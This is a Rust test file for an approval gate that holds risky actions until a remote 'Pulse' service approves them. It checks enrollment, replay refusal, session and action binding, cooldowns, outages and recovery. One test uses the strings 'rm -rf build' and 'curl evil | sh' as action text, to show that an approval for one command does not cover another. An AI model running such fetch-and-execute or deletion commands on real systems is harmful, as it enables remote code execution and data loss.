//! Pulse acceptance tests through the resident wire op. A fake Yanez
//! deployment signs every receipt with real Ed25519 and BLS12-381 keys.

use std::path::{Path, PathBuf};
use std::rc::Rc;

use guard_yanez_pulse::testkit::{Decision, FakePulse, UserKey, YanezKey, AGENT_KEY};
use guard_yanez_pulse::AssuranceTier;
use serde_json::{json, Value};

use crate::approval_gate_pulse::{pending_len, TEST_TRANSPORT};
use crate::approval_gate_state::{epoch, load_state, write_state};

const NOW: &str = "2026-10-02T00:00:00+00:00";
const LATER: &str = "2026-10-02T00:00:30+00:00";
const PASSWORD: &str = "correct horse battery";

/// The binding the daemon and CLI send to turn Pulse off.
fn disable_binding() -> Value {
    json!({"settings_change": {"kind": "pulse_disable"}})
}

struct Gate {
    home: PathBuf,
    fake: Rc<FakePulse>,
    signals: &'static str,
}

impl Drop for Gate {
    fn drop(&mut self) {
        TEST_TRANSPORT.with(|t| t.borrow_mut().take());
        let _ = std::fs::remove_dir_all(&self.home);
    }
}

fn send_from(home: &Path, signals: &str, method: &str, now: &str, extra: Value) -> Value {
    let mut request = json!({
        "schema": "guard-approval-gate-request.v1",
        "request_id": "t",
        "guard_home": home.to_string_lossy(),
        "method": method,
        "now": now,
        "session_signals": [signals],
    });
    for (k, v) in extra.as_object().expect("object") {
        request[k] = v.clone();
    }
    let request: guard_contracts::ApprovalGateRequestV1 =
        serde_json::from_value(request).expect("request");
    let bytes = crate::approval_gate_op::evaluate_approval_gate_request(&request).expect("bytes");
    serde_json::from_slice(&bytes).expect("result")
}

impl Gate {
    fn send(&self, method: &str, now: &str, extra: Value) -> Value {
        send_from(&self.home, self.signals, method, now, extra)
    }

    /// Request, poll and verify one held action; returns the verify result.
    fn approve(&self, purpose: &str, action: &str, scope: &str, extra_input: Value) -> Value {
        let created = self.request(purpose, action, scope, false);
        let id = created["payload"]["request_id"]
            .as_str()
            .expect("id")
            .to_owned();
        let polled = self.poll(&id);
        assert_eq!(polled["payload"]["status"], "approved", "{polled}");
        let mut input = json!({"pulse_request_id": id});
        for (k, v) in extra_input.as_object().unwrap() {
            input[k] = v.clone();
        }
        self.verify(purpose, action, scope, false, input)
    }

    fn request(&self, purpose: &str, action: &str, scope: &str, strict: bool) -> Value {
        self.send(
            "pulse_request",
            NOW,
            json!({"purpose": purpose, "strict": strict, "params": {"action": action, "scope": scope}}),
        )
    }

    fn poll(&self, id: &str) -> Value {
        self.send("pulse_poll", NOW, json!({"params": {"request_id": id}}))
    }

    fn verify(
        &self,
        purpose: &str,
        action: &str,
        scope: &str,
        strict: bool,
        input: Value,
    ) -> Value {
        self.send(
            "verify",
            LATER,
            json!({
                "purpose": purpose,
                "strict": strict,
                "params": {"action": action, "scope": scope},
                "approval_gate_input": input,
            }),
        )
    }
}

fn home(tag: &str) -> PathBuf {
    let h = std::env::temp_dir().join(format!(
        "gate-pulse-{tag}-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    std::fs::create_dir_all(&h).unwrap();
    h
}

/// A password gate, without Pulse yet.
fn password_gate(tag: &str) -> Gate {
    let home = home(tag);
    let mut st = load_state(&home);
    let o = st.as_object_mut().unwrap();
    o.insert("enabled".into(), json!(true));
    o.insert("fail_closed".into(), json!(false));
    o.insert(
        "verifier".into(),
        crate::approval_gate_settings::create_verifier(PASSWORD).unwrap(),
    );
    write_state(&home, &st, Some(NOW)).unwrap();
    let fake = Rc::new(FakePulse::new(epoch(Some(NOW)) as i64));
    TEST_TRANSPORT.with(|t| *t.borrow_mut() = Some(fake.clone()));
    Gate {
        home,
        fake,
        signals: "sid=tty-1",
    }
}

fn begin(g: &Gate) -> Value {
    g.send(
        "begin_pulse_enrollment",
        NOW,
        json!({
            "approval_gate_input": {"password": PASSWORD, "pulse_agent_key": AGENT_KEY},
        }),
    )
}

/// A gate with Pulse enrolled; returns the recovery code.
fn pulse_gate(tag: &str, cooldown: i64) -> (Gate, String) {
    let g = password_gate(tag);
    let begun = begin(&g);
    assert_eq!(begun["status"], "ok", "{begun}");
    let id = begun["payload"]["request_id"].as_str().unwrap().to_owned();
    assert_eq!(g.poll(&id)["payload"]["status"], "approved");
    let confirmed = g.send(
        "confirm_pulse_enrollment",
        NOW,
        json!({"params": {"request_id": id, "cooldown_seconds": cooldown}}),
    );
    assert_eq!(confirmed["status"], "ok", "{confirmed}");
    assert_eq!(confirmed["payload"]["pulse_enabled"], true);
    let code = confirmed["payload"]["recovery_code"]
        .as_str()
        .unwrap()
        .to_owned();
    (g, code)
}

fn code(result: &Value) -> &str {
    result["code"].as_str().unwrap_or_default()
}

#[test]
fn enrollment_pins_yid_issuer_agent_key_and_hides_secrets() {
    let (g, _) = pulse_gate("enroll", 0);
    let raw = std::fs::read_to_string(g.home.join("approval-gate.json")).unwrap();
    assert!(
        !raw.contains(AGENT_KEY),
        "agent key must not be in the gate file"
    );
    let st = load_state(&g.home);
    assert_eq!(st["pulse_yid"], "yid_test_owner");
    assert_eq!(st["pulse_issuer"], "https://yid.yanez.ai");
    assert_eq!(st["pulse_agent_key_id"], "yak_0123456789ab");
    assert_eq!(st["pulse_user_keys"], json!([g.fake.user.public_hex()]));
    let cfg = g.send("public_config", NOW, json!({}));
    assert_eq!(cfg["payload"]["pulse_enabled"], true);
    assert_eq!(cfg["payload"]["pulse_cooldown_seconds"], 0);
    assert!(!cfg.to_string().contains("yid_test_owner"));
}

#[test]
fn enrollment_needs_the_current_factor() {
    let g = password_gate("enroll-pw");
    let r = g.send(
        "begin_pulse_enrollment",
        NOW,
        json!({"approval_gate_input": {"password": "wrong password!!", "pulse_agent_key": AGENT_KEY}}),
    );
    assert_eq!(code(&r), "approval_gate_invalid_password");
    assert!(g.fake.created.borrow().is_empty());
}

#[test]
fn a_confirmed_password_lets_the_same_session_start_setup() {
    let g = password_gate("authorize");
    let key_only = json!({"approval_gate_input": {"pulse_agent_key": AGENT_KEY}});
    let r = g.send("begin_pulse_enrollment", NOW, key_only.clone());
    assert_eq!(
        code(&r),
        "approval_gate_pulse_setup_expired",
        "no password, no setup"
    );

    let wrong = g.send(
        "begin_pulse_enrollment",
        NOW,
        json!({"params": {"authorize_only": true}, "approval_gate_input": {"password": "wrong password!!"}}),
    );
    assert_eq!(code(&wrong), "approval_gate_invalid_password");
    assert_eq!(
        load_state(&g.home)["password_failed_attempts"],
        1,
        "a wrong password counts"
    );

    let ok = g.send(
        "begin_pulse_enrollment",
        NOW,
        json!({"params": {"authorize_only": true}, "approval_gate_input": {"password": PASSWORD}}),
    );
    assert_eq!(ok["payload"]["status"], "authorized", "{ok}");
    assert!(
        g.fake.created.borrow().is_empty(),
        "authorizing sends nothing to Pulse"
    );

    let other = send_from(
        &g.home,
        "sid=other",
        "begin_pulse_enrollment",
        NOW,
        key_only.clone(),
    );
    assert_eq!(
        code(&other),
        "approval_gate_pulse_setup_expired",
        "another session"
    );

    // Twice in the window, e.g. after a refused scan.
    let mut id = String::new();
    for _ in 0..2 {
        let begun = g.send("begin_pulse_enrollment", NOW, key_only.clone());
        assert_eq!(begun["payload"]["status"], "pending", "{begun}");
        id = begun["payload"]["request_id"].as_str().unwrap().to_owned();
    }
    g.poll(&id);
    let confirmed = g.send(
        "confirm_pulse_enrollment",
        NOW,
        json!({"params": {"request_id": id}}),
    );
    assert_eq!(confirmed["payload"]["pulse_enabled"], true, "{confirmed}");
}

#[test]
fn a_setup_authorization_expires() {
    let g = password_gate("authorize-late");
    g.send(
        "begin_pulse_enrollment",
        NOW,
        json!({"params": {"authorize_only": true}, "approval_gate_input": {"password": PASSWORD}}),
    );
    let r = g.send(
        "begin_pulse_enrollment",
        "2026-10-02T00:15:01+00:00",
        json!({"approval_gate_input": {"pulse_agent_key": AGENT_KEY}}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_setup_expired");
}

#[test]
fn enrollment_must_be_confirmed_from_the_same_session() {
    let g = password_gate("enroll-sess");
    let id = begin(&g)["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    g.poll(&id);
    let r = send_from(
        &g.home,
        "sid=other",
        "confirm_pulse_enrollment",
        NOW,
        json!({"params": {"request_id": id}}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_terms_mismatch");
}

#[test]
fn accept_issues_a_pulse_grant_for_the_exact_action() {
    let (g, _) = pulse_gate("accept", 0);
    let r = g.approve(
        "approval_decision",
        "allow-once:abc",
        "workspace",
        json!({}),
    );
    assert_eq!(r["status"], "ok", "{r}");
    let grant = &r["payload"]["grant"];
    assert_eq!(grant["factor_set"], json!(["pulse"]));
    assert_eq!(grant["action"], "allow-once:abc");
    assert_eq!(grant["used_cooldown"], false);
    // The terms Pulse saw carry no action text.
    let sent = g.fake.created.borrow().values().last().unwrap().to_string();
    assert!(!sent.contains("allow-once:abc") && !sent.contains("workspace"));
}

#[test]
fn reject_and_expiry_fail_closed() {
    let (g, _) = pulse_gate("reject", 0);
    for (decision, status) in [
        (Decision::Reject, "rejected"),
        (Decision::Expire, "expired"),
    ] {
        *g.fake.decision.borrow_mut() = decision;
        let id = g.request("approval_decision", "a", "s", false)["payload"]["request_id"]
            .as_str()
            .unwrap()
            .to_owned();
        assert_eq!(g.poll(&id)["payload"]["status"], status);
        let r = g.verify(
            "approval_decision",
            "a",
            "s",
            false,
            json!({"pulse_request_id": id}),
        );
        assert_eq!(code(&r), "approval_gate_pulse_required", "{r}");
    }
}

#[test]
fn a_pending_request_is_not_an_approval() {
    let (g, _) = pulse_gate("pending", 0);
    *g.fake.decision.borrow_mut() = Decision::Pending;
    let id = g.request("approval_decision", "a", "s", false)["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    assert_eq!(g.poll(&id)["payload"]["status"], "pending");
    let r = g.verify(
        "approval_decision",
        "a",
        "s",
        false,
        json!({"pulse_request_id": id}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_pending");
    // A request past its consent bound is expired locally, with no network.
    let late = g.send(
        "pulse_poll",
        "2026-10-02T01:00:00+00:00",
        json!({"params": {"request_id": id}}),
    );
    assert_eq!(late["payload"]["status"], "expired");
}

#[test]
fn wrong_yid_is_refused() {
    let (g, _) = pulse_gate("yid", 0);
    *g.fake.yid.borrow_mut() = "yid_someone_else".into();
    let r = g.approve("approval_decision", "a", "s", json!({}));
    assert_eq!(code(&r), "approval_gate_pulse_wrong_yid", "{r}");
}

#[test]
fn low_assurance_is_refused() {
    let (g, _) = pulse_gate("tier", 0);
    *g.fake.approve_tier.borrow_mut() = AssuranceTier::Low;
    let r = g.approve("approval_decision", "a", "s", json!({}));
    assert_eq!(code(&r), "approval_gate_pulse_assurance_too_low", "{r}");
}

#[test]
fn medium_and_high_scans_are_accepted() {
    let (g, _) = pulse_gate("tier-ok", 0);
    for (tier, action) in [(AssuranceTier::Medium, "m"), (AssuranceTier::High, "h")] {
        *g.fake.approve_tier.borrow_mut() = tier;
        let r = g.approve("approval_decision", action, "s", json!({}));
        assert_eq!(r["payload"]["grant"]["factor_set"], json!(["pulse"]), "{r}");
    }
}

#[test]
fn enrollment_needs_a_device_that_can_sign_at_medium() {
    let g = password_gate("no-key");
    *g.fake.user_tier.borrow_mut() = Some(AssuranceTier::Low);
    let r = begin(&g);
    assert_eq!(code(&r), "approval_gate_pulse_no_signing_key", "{r}");
    assert!(g.fake.created.borrow().is_empty());
}

#[test]
fn a_receipt_is_single_use() {
    let (g, _) = pulse_gate("replay", 0);
    let id = g.request("approval_decision", "a", "s", false)["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    g.poll(&id);
    let input = json!({"pulse_request_id": id});
    assert_eq!(
        g.verify("approval_decision", "a", "s", false, input.clone())["status"],
        "ok"
    );
    let replay = g.verify("approval_decision", "a", "s", false, input);
    assert_eq!(code(&replay), "approval_gate_pulse_required");
    assert_eq!(
        g.fake.consumed.borrow().len(),
        2,
        "enrollment + one approval"
    );
}

#[test]
fn the_local_ledger_refuses_a_receipt_pulse_would_also_refuse() {
    let (g, _) = pulse_gate("ledger", 0);
    let id = g.request("approval_decision", "a", "s", false)["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    g.poll(&id);
    // Simulate a crash after the local spend: the jti is already in the ledger.
    let mut st = load_state(&g.home);
    st["pulse_consumed"][&id] = json!(epoch(Some(NOW)) as i64 + 600);
    write_state(&g.home, &st, Some(NOW)).unwrap();
    let r = g.verify(
        "approval_decision",
        "a",
        "s",
        false,
        json!({"pulse_request_id": id}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_replayed");
    assert_eq!(
        g.fake.consumed.borrow().len(),
        1,
        "no remote consume after a local refusal"
    );
}

#[test]
fn an_approval_for_one_action_does_not_cover_another() {
    let (g, _) = pulse_gate("bind", 0);
    let id = g.request("approval_decision", "rm -rf build", "s", false)["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    g.poll(&id);
    let r = g.verify(
        "approval_decision",
        "curl evil | sh",
        "s",
        false,
        json!({"pulse_request_id": id}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_terms_mismatch");
}

#[test]
fn an_approval_from_another_session_is_refused() {
    let (g, _) = pulse_gate("sess", 0);
    let id = g.request("approval_decision", "a", "s", false)["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    g.poll(&id);
    let r = send_from(
        &g.home,
        "sid=agent-shell",
        "verify",
        LATER,
        json!({"purpose": "approval_decision", "params": {"action": "a", "scope": "s"},
               "approval_gate_input": {"pulse_request_id": id}}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_terms_mismatch");
}

#[test]
fn no_password_or_totp_fallback() {
    let (g, _) = pulse_gate("nofallback", 0);
    let r = g.verify(
        "approval_decision",
        "a",
        "s",
        false,
        json!({"password": PASSWORD}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_required");
    let r = g.send(
        "unlock_cooldown",
        NOW,
        json!({"duration_seconds": 900, "approval_gate_input": {"password": PASSWORD}}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_required");
    let r = g.send(
        "begin_totp_enrollment",
        NOW,
        json!({"approval_gate_input": {"password": PASSWORD}}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_enabled");
}

#[test]
fn an_outage_fails_closed() {
    let (g, _) = pulse_gate("outage", 0);
    *g.fake.offline.borrow_mut() = true;
    let r = g.request("approval_decision", "a", "s", false);
    assert_eq!(code(&r), "approval_gate_pulse_unavailable");
    assert_eq!(r["error_status"], 503);
    // An approval that arrived before the outage still cannot be consumed.
    *g.fake.offline.borrow_mut() = false;
    let id = g.request("approval_decision", "a", "s", false)["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    g.poll(&id);
    *g.fake.offline.borrow_mut() = true;
    let r = g.verify(
        "approval_decision",
        "a",
        "s",
        false,
        json!({"pulse_request_id": id}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_unavailable");
}

#[test]
fn a_hard_block_never_creates_a_pulse_request() {
    let (g, _) = pulse_gate("block", 0);
    let before = g.fake.created.borrow().len();
    for verdict in ["block", "sandbox-required", "allow"] {
        let r = g.send(
            "pulse_request",
            NOW,
            json!({"purpose": "approval_decision", "params": {"action": "a", "scope": "s", "verdict": verdict}}),
        );
        assert_eq!(code(&r), "approval_gate_pulse_not_reviewable");
    }
    assert_eq!(g.fake.created.borrow().len(), before);
}

#[test]
fn an_open_cooldown_covers_only_the_same_purpose_scope_and_session() {
    let (g, _) = pulse_gate("cooldown", 900);
    let r = g.approve(
        "approval_decision",
        "a",
        "workspace",
        json!({"use_cooldown": true}),
    );
    assert_eq!(r["status"], "ok", "{r}");
    assert!(r["payload"]["grant"]["cooldown_expires_at"].is_string());
    let created = g.fake.created.borrow().len();
    // Same purpose and scope: no Pulse request, and a cooldown grant.
    let covered = g.request("approval_decision", "b", "workspace", false);
    assert_eq!(covered["payload"]["status"], "cooldown_covered");
    assert_eq!(g.fake.created.borrow().len(), created);
    let grant = g.verify("approval_decision", "b", "workspace", false, json!({}));
    assert_eq!(grant["payload"]["grant"]["factor_set"], json!(["cooldown"]));
    // Another scope, a strict decision, or another session asks again.
    assert_eq!(
        g.request("approval_decision", "b", "global", false)["payload"]["status"],
        "pending"
    );
    assert_eq!(
        g.request("approval_decision", "b", "workspace", true)["payload"]["status"],
        "pending"
    );
    let other = send_from(
        &g.home,
        "sid=other",
        "pulse_request",
        NOW,
        json!({"purpose": "approval_decision", "params": {"action": "b", "scope": "workspace"}}),
    );
    assert_eq!(other["payload"]["status"], "pending");
}

#[test]
fn the_default_is_a_fresh_approval_every_time() {
    let (g, _) = pulse_gate("fresh", 0);
    let r = g.approve(
        "approval_decision",
        "a",
        "workspace",
        json!({"use_cooldown": true}),
    );
    assert!(r["payload"]["grant"]["cooldown_expires_at"].is_null());
    assert_eq!(
        g.request("approval_decision", "b", "workspace", false)["payload"]["status"],
        "pending"
    );
}

#[test]
fn a_forged_cooldown_record_is_ignored() {
    let (g, _) = pulse_gate("forged", 900);
    let mut st = load_state(&g.home);
    st["pulse_cooldown"] = json!({
        "purpose": "approval_decision", "scope": "workspace",
        "session_binding": crate::approval_gate_verify::current_totp_session_binding(),
        "expires_at": "2099-01-01T00:00:00+00:00", "factor_generation": st["factor_generation"],
        "mac": "00",
    });
    write_state(&g.home, &st, Some(NOW)).unwrap();
    assert_eq!(
        g.request("approval_decision", "a", "workspace", false)["payload"]["status"],
        "pending"
    );
}

#[test]
fn agent_key_revocation_and_device_removal_fail_closed() {
    let (g, _) = pulse_gate("revoke", 0);
    *g.fake.user_registered.borrow_mut() = false;
    let r = g.approve("approval_decision", "a", "s", json!({}));
    assert_eq!(code(&r), "approval_gate_pulse_user_key_unregistered");
    *g.fake.user_registered.borrow_mut() = true;
    *g.fake.agent_key_revoked.borrow_mut() = true;
    let r = g.request("approval_decision", "a", "s", false);
    assert_eq!(code(&r), "approval_gate_pulse_agent_key_rejected");
    assert_eq!(r["error_status"], 423);
}

#[test]
fn a_device_guard_did_not_pin_cannot_approve() {
    let (g, _) = pulse_gate("unpinned", 0);
    // Guard pinned another device at enrollment; the approving one is
    // registered at Yanez, but Yanez alone cannot add a key.
    let mut st = load_state(&g.home);
    st["pulse_user_keys"] = json!([UserKey::new(3).public_hex()]);
    write_state(&g.home, &st, Some(NOW)).unwrap();
    let r = g.approve("approval_decision", "a", "s", json!({}));
    assert_eq!(code(&r), "approval_gate_pulse_user_key_unconfirmed", "{r}");
}

#[test]
fn yanez_key_rotation_is_picked_up_after_one_refresh() {
    let (g, _) = pulse_gate("rotate", 0);
    assert_eq!(
        g.approve("approval_decision", "a", "s", json!({}))["status"],
        "ok"
    );
    let fetches = *g.fake.public_key_fetches.borrow();
    g.fake
        .yanez_keys
        .borrow_mut()
        .push(YanezKey::new("yanez-2026-07", 2));
    let r = g.approve("approval_decision", "b", "s", json!({}));
    assert_eq!(r["status"], "ok", "{r}");
    assert!(*g.fake.public_key_fetches.borrow() > fetches);
}

#[test]
fn disabling_pulse_needs_a_fresh_pulse_approval() {
    let (g, _) = pulse_gate("disable", 0);
    let r = g.send("disable_pulse", NOW, json!({}));
    assert_eq!(code(&r), "approval_gate_pulse_required");
    let id = g.send(
        "pulse_request",
        NOW,
        json!({"purpose": "settings_write", "strict": true, "params": disable_binding()}),
    )["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    g.poll(&id);
    let verified = g.send(
        "verify",
        LATER,
        json!({"purpose": "settings_write", "strict": true, "params": disable_binding(),
               "approval_gate_input": {"pulse_request_id": id}}),
    );
    assert_eq!(verified["status"], "ok", "{verified}");
    let off = g.send(
        "disable_pulse",
        LATER,
        json!({"approval_gate_grant": verified["payload"]["grant"]}),
    );
    assert_eq!(off["status"], "ok", "{off}");
    assert_eq!(off["payload"]["pulse_enabled"], false);
    assert!(load_state(&g.home).get("pulse_yid").is_none());
}

#[test]
fn recovery_needs_the_password_and_the_one_time_code() {
    let (g, recovery) = pulse_gate("recover", 0);
    let wrong = g.send(
        "recover_pulse",
        NOW,
        json!({"approval_gate_input": {"password": PASSWORD, "pulse_recovery_code": "nope"}}),
    );
    assert_eq!(code(&wrong), "approval_gate_pulse_recovery_invalid");
    let no_password = g.send(
        "recover_pulse",
        NOW,
        json!({"approval_gate_input": {"pulse_recovery_code": recovery}}),
    );
    assert_eq!(code(&no_password), "approval_gate_required");
    let ok = g.send(
        "recover_pulse",
        NOW,
        json!({"approval_gate_input": {"password": PASSWORD, "pulse_recovery_code": recovery}}),
    );
    assert_eq!(ok["status"], "ok", "{ok}");
    assert_eq!(ok["payload"]["pulse_enabled"], false);
    // Back on the password factor, and the old code is gone with Pulse.
    let r = g.verify(
        "approval_decision",
        "a",
        "s",
        false,
        json!({"password": PASSWORD}),
    );
    assert_eq!(r["payload"]["grant"]["factor_set"], json!(["password"]));
}

#[test]
fn pulse_pauses_the_authenticator_without_deleting_it() {
    let g = password_gate("pause-totp");
    let secret = crate::totp::generate_totp_secret().unwrap();
    let mut store = crate::totp::TotpSecretStore::new(&g.home);
    store.ensure_ready().unwrap();
    store.set_secret("totp-kept", &secret).unwrap();
    let mut st = load_state(&g.home);
    let o = st.as_object_mut().unwrap();
    o.insert("totp_enabled".into(), json!(true));
    o.insert("totp_secret_id".into(), json!("totp-kept"));
    write_state(&g.home, &st, Some(NOW)).unwrap();
    let totp_at =
        |now: &str| crate::totp::totp_code_at_counter(&secret, (epoch(Some(now)) as u64) / 30);

    let begun = g.send(
        "begin_pulse_enrollment",
        NOW,
        json!({"approval_gate_input": {
            "password": PASSWORD, "totp_code": totp_at(NOW), "pulse_agent_key": AGENT_KEY,
        }}),
    );
    assert_eq!(begun["status"], "ok", "{begun}");
    let id = begun["payload"]["request_id"].as_str().unwrap().to_owned();
    g.poll(&id);
    let confirmed = g.send(
        "confirm_pulse_enrollment",
        NOW,
        json!({"params": {"request_id": id, "cooldown_seconds": 0}}),
    );
    assert_eq!(confirmed["payload"]["pulse_enabled"], true, "{confirmed}");
    assert_eq!(confirmed["payload"]["totp_enabled"], false);
    let recovery = confirmed["payload"]["recovery_code"]
        .as_str()
        .unwrap()
        .to_owned();

    // Kept, but Guard accepts no authenticator code while Pulse is on.
    let st = load_state(&g.home);
    assert_eq!(st["totp_secret_id"], "totp-kept");
    assert_eq!(st["totp_paused_by_pulse"], true);
    assert_eq!(
        crate::totp::TotpSecretStore::new(&g.home)
            .get_secret("totp-kept")
            .as_deref(),
        Some(secret.as_str())
    );
    let r = g.verify(
        "approval_decision",
        "a",
        "s",
        false,
        json!({"totp_code": totp_at(LATER)}),
    );
    assert_eq!(code(&r), "approval_gate_pulse_required");

    // Turning Pulse off brings the same authenticator back.
    let ok = g.send(
        "recover_pulse",
        NOW,
        json!({"approval_gate_input": {"password": PASSWORD, "pulse_recovery_code": recovery}}),
    );
    assert_eq!(ok["payload"]["pulse_enabled"], false, "{ok}");
    assert_eq!(ok["payload"]["totp_enabled"], true);
    assert!(load_state(&g.home).get("totp_paused_by_pulse").is_none());
    let r = g.verify(
        "approval_decision",
        "a",
        "s",
        false,
        json!({"password": PASSWORD}),
    );
    assert_eq!(code(&r), "approval_gate_totp_required");
    let r = g.verify(
        "approval_decision",
        "a",
        "s",
        false,
        json!({"totp_code": totp_at(LATER)}),
    );
    assert_eq!(r["payload"]["grant"]["factor_set"], json!(["totp"]), "{r}");
}

#[test]
fn without_an_authenticator_turning_pulse_off_returns_to_the_password() {
    let (g, recovery) = pulse_gate("no-totp", 0);
    assert!(load_state(&g.home).get("totp_paused_by_pulse").is_none());
    let ok = g.send(
        "recover_pulse",
        NOW,
        json!({"approval_gate_input": {"password": PASSWORD, "pulse_recovery_code": recovery}}),
    );
    assert_eq!(ok["payload"]["totp_enabled"], false, "{ok}");
}

#[test]
fn enrolling_pulse_ends_older_grants() {
    let g = password_gate("rotation");
    let before = g.verify(
        "settings_write",
        "x",
        "s",
        true,
        json!({"password": PASSWORD}),
    );
    let grant = before["payload"]["grant"].clone();
    let id = begin(&g)["payload"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    g.poll(&id);
    g.send(
        "confirm_pulse_enrollment",
        NOW,
        json!({"params": {"request_id": id}}),
    );
    let r = g.send(
        "validate_grant",
        LATER,
        json!({"purpose": "settings_write", "strict": true, "approval_gate_grant": grant}),
    );
    assert_eq!(code(&r), "approval_gate_required");
    assert_eq!(pending_len(&g.home), 0);
}

#[test]
fn a_zero_pulse_cooldown_without_pulse_changes_nothing() {
    // The public config reports `pulse_cooldown_seconds: 0` while Pulse is off,
    // so a settings save or import sends it back. Only a real cooldown needs Pulse.
    let home = home("cooldown-without-pulse");
    let validate = |cooldown: i64| {
        send_from(
            &home,
            "sid=tty-1",
            "validate_settings_update",
            NOW,
            json!({"params": {"cooldown_seconds": 0, "pulse_cooldown_seconds": cooldown}}),
        )
    };
    let zero = validate(0);
    assert_eq!(zero["status"], "ok", "{zero}");
    let real = validate(900);
    assert_eq!(code(&real), "approval_gate_pulse_not_enabled", "{real}");
    let _ = std::fs::remove_dir_all(&home);
}

#[path = "approval_gate_pulse_review_tests.rs"]
mod review;

#[path = "approval_gate_pulse_binding_tests.rs"]
mod binding;

#[path = "approval_gate_pulse_command_flow_tests.rs"]
mod command_flow;
